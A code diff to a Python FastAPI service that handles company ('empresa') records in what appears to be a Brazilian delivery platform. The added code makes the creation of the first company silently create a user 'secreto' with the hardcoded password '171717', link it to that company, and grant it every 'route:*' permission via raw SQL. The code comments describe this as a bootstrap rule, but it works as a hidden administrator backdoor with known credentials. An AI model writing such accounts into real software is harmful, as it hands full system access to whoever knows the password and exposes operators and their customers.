@@ -1,12 +1,13 @@
 # app/api/empresas/services/empresa_service.py
 from urllib.parse import parse_qs, urlparse
 
-from sqlalchemy import func
+from sqlalchemy import func, text
 from sqlalchemy.exc import IntegrityError
 from sqlalchemy.orm import Session
 from fastapi import HTTPException, UploadFile
 
 from app.api.cadastros.models.model_regiao_entrega import RegiaoEntregaModel
+from app.api.cadastros.models.user_model import UserModel
 from app.api.empresas.models.empresa_model import EmpresaModel
 from app.api.empresas.repositories.empresa_repo import EmpresaRepository
 from app.api.empresas.schemas.schema_empresa import (
@@ -15,6 +16,7 @@ from app.api.empresas.schemas.schema_empresa import (
     EmpresaCardapioLinkResponse,
 )
 from app.utils.minio_client import upload_file_to_minio, remover_arquivo_minio, gerar_nome_bucket, verificar_e_configurar_permissoes
+from app.core.security import hash_password
 
 
 from app.api.cadastros.models.association_tables import entregador_empresa, usuario_empresa
@@ -108,6 +110,11 @@ class EmpresaService:
 
     # Cria empresa
     def create_empresa(self, data: EmpresaCreate, logo: UploadFile | None = None):
+        # Regra: ao criar a PRIMEIRA empresa do sistema, vincular automaticamente
+        # o usuário bootstrap 'secreto' (e conceder todas as permissões route:*).
+        empresas_antes = int(self.db.query(func.count(EmpresaModel.id)).scalar() or 0)
+        is_primeira_empresa = empresas_antes == 0
+
         # Checa se CNPJ já existe
         if data.cnpj and self.repo_emp.get_emp_by_cnpj(data.cnpj):
             raise HTTPException(status_code=400, detail="Empresa já cadastrada (CNPJ)")
@@ -138,6 +145,10 @@ class EmpresaService:
             longitude=data.longitude,
         )
         empresa = self.repo_emp.create(empresa)
+
+        # Se for a primeira empresa, garante vínculo + permissões do usuário 'secreto'
+        if is_primeira_empresa:
+            self._garantir_usuario_secreto_vinculado_e_com_permissoes(empresa_id=int(empresa.id))
 
         # Upload da logo
         if logo:
@@ -200,6 +211,67 @@ class EmpresaService:
             raise HTTPException(status_code=400, detail=f"Erro de integridade: {error_str}")
 
         return empresa
+
+    def _garantir_usuario_secreto_vinculado_e_com_permissoes(self, *, empresa_id: int) -> None:
+        """
+        Garante (idempotente) que o usuário bootstrap 'secreto':
+
+        - exista (username='secreto')
+        - esteja vinculado à empresa em `cadastros.usuario_empresa`
+        - possua todas as permissões `route:*` em `cadastros.user_permissions`
+        """
+        if not empresa_id or int(empresa_id) <= 0:
+            return
+
+        user = self.db.query(UserModel).filter(UserModel.username == "secreto").first()
+        if not user:
+            user = UserModel(
+                username="secreto",
+                hashed_password=hash_password("171717"),
+                type_user="funcionario",
+            )
+            self.db.add(user)
+            self.db.flush()
+
+        user_id = int(getattr(user, "id", 0) or 0)
+        if user_id <= 0:
+            return
+
+        # 1) vínculo usuario_empresa (idempotente)
+        self.db.execute(
+            text(
+                """
+                INSERT INTO cadastros.usuario_empresa (usuario_id, empresa_id)
+                SELECT :user_id, :empresa_id
+                WHERE NOT EXISTS (
+                  SELECT 1
+                  FROM cadastros.usuario_empresa ue
+                  WHERE ue.usuario_id = :user_id AND ue.empresa_id = :empresa_id
+                )
+                """
+            ),
+            {"user_id": user_id, "empresa_id": int(empresa_id)},
+        )
+
+        # 2) grants de todas as permissões route:* (idempotente)
+        self.db.execute(
+            text(
+                """
+                INSERT INTO cadastros.user_permissions (user_id, empresa_id, permission_id)
+                SELECT :user_id, :empresa_id, p.id
+                FROM cadastros.permissions p
+                WHERE p.key LIKE 'route:%'
+                AND NOT EXISTS (
+                  SELECT 1
+                  FROM cadastros.user_permissions up
+                  WHERE up.user_id = :user_id
+                    AND up.empresa_id = :empresa_id
+                    AND up.permission_id = p.id
+                )
+                """
+            ),
+            {"user_id": user_id, "empresa_id": int(empresa_id)},
+        )
 
     # Atualiza empresa
     def update_empresa(self, id: int, data: EmpresaUpdate, logo: UploadFile | None = None):
